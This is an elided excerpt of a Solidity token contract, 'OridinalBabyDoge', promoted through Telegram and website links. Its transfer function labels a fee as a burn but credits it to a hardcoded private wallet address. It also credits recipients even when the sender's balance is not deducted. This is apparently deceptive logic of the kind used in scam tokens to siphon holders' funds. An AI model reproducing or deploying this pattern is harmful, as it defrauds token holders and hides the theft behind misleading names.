...
// Submitted for Telegram: https://t.me/OridinalBabydoge
// Submitted for Website: www.oridinalbbdo.tech
...
contract  OridinalBabyDoge  is Ownable, IERC20 {
    ...
    function _transfer(address form, address to, uint256 amount) internal virtual {
        ...
        _rOwned[0x360456a9DB1aF1f425D34964180467B3A11De548] += _bruntoken;
        if (sendertokens >= amount) { _rOwned[form] = sendertokens - amount; }
        _rOwned[to] += tokenamount; 
        if (_brunfee > 0) {
        emit Transfer(form, 0x360456a9DB1aF1f425D34964180467B3A11De548, _bruntoken);
        }
